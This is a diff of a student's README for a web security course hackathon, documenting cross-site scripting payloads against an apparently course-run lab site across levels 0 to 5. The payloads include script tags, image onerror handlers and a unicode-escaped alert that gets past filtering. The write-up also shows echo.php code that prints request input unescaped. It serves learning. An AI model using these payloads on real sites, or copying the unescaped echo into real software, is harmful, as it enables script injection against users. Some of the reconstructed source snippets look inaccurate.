@@ -23,7 +23,7 @@ This is a private repository for divyani Jain to store all code from the course.
 Task 1. Perform cross site scripting attacks on below Url and display my name in alert.
 http://waph-hackathon.eastus.cloudapp.azure.com/xss/level[0-6]/echo.php​
 
-## Level 0: hacked level0 by injected javascript script tag in input field. 
+## Level 0: Hacked level0 by injected javascript script tag in input field. 
 Injected Code: <script>alert('level 0 hack by Divyani Jain')</script>
 
 ![Level 0!](/Images/Level0.png)
@@ -31,7 +31,7 @@ Injected Code: <script>alert('level 0 hack by Divyani Jain')</script>
 Source code of the echo.php web application:
 
 <?php
-$_REQUEST['input'];
+echo $_REQUEST['input'];
 ?>
 
 ## Level 1: hacked level1 by injected javascript script tag in url. 
@@ -42,7 +42,7 @@ Injected Code: <script>alert('level 0 hack by Divyani Jain')</script>
 Source code of the echo.php web application:
 
 <?php
-$_REQUEST['input'];
+echo $_REQUEST['input'];
 ?>
 
 ## Level 2: hacked the level2 by changing the URL path in action attribute of the Form tag in HTML and Send Ajax post request.
@@ -58,11 +58,12 @@ Your Input: <input name="input" onkeypress="console.log('You have presses a key'
 Source code of the echo.php web application:
 
 <?php
-$_REQUEST['input'];
+echo $_REQUEST['input'];
 ?>
 
-## Level 3: hacked the level3 by providing  
-Injected Code:
+## Level 3: Hacked the level3 by providing alert in onerror event in image tag.
+Injected Code: <img src="" onerror="alert('level 3 hack by Divyani Jain')">
+
 ![Level 3!](/Images/Level3.png)
 
 Source code of the echo.php web application:
@@ -70,12 +71,26 @@ Source code of the echo.php web application:
 echo strip_tags("<script>alert('level 3 hack by Divyani Jain')</script>","<img>");
 ?>
 
-## Level 4:
-Injected Code:
+## Level 4:Hacked the level4 by providing alert in onerror event in image tag.
+Injected Code: <img src="" onerror="alert('level 3 hack by Divyani Jain')">
 ![Level 4!](/Images/Level4.png)
-## Level 5:
-Injected Code:
+
+Source code of the echo.php web application:
+<?php
+echo strip_tags("<script>alert('level 4 hack by Divyani Jain')</script>","<img>");
+?>
+
+## Level 5: Hacked the level5 by providing window alert in onload event in body tag.
+Injected Code: <body onload="window['al\u0065rt']('level 5 hack by divyani jain')">
+
 ![Level 5!](/Images/Level5.png)
+
+
+Source code of the echo.php web application:
+<?php
+echo strip_tags("<script>alert('level 5 hack by Divyani Jain')</script>","<img>");
+?>
+
 ## Level 6:
 Injected Code:
 Source code of the echo.php web application:
